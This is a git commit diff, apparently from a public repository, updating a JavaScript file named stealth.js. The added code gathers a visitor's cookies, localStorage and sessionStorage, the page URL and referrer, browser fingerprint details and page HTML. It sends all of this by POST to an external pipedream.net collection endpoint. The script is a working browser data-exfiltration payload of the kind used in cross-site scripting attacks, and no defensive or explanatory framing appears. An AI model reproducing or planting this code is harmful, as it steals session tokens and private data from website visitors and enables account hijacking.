e91528d41c5da1e77458b33e662c3114ef502d33
Raden Adhiyaksa Indiharto <70601366+radenadhiyaksa@users.noreply.github.com>
2025-05-18 21:27:45 +0900

    Update stealth.js

--- stealth.js
+++ stealth.js
@@ -1,12 +1,25 @@
-fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
+(function () {
+  const data = {
     cookie: document.cookie,
     location: location.href,
+    referrer: document.referrer,
     userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen: {
+      width: screen.width,
+      height: screen.height
+    },
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
     html: document.documentElement?.outerHTML?.slice(0, 1000),
     ts: new Date().toISOString(),
     id: Math.random().toString(36).substring(2)
-  })
-});
+  };
+
+  fetch("https://236fb3a628ae3f3aef9dc3bd171c41c6.m.pipedream.net", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  });
+})();
